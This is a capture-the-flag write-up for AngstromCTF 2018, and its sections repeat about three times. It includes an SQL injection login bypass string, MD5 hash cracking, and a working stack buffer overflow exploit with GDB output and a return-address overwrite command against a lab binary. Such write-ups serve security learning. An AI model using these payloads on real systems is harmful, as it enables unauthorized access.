For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`


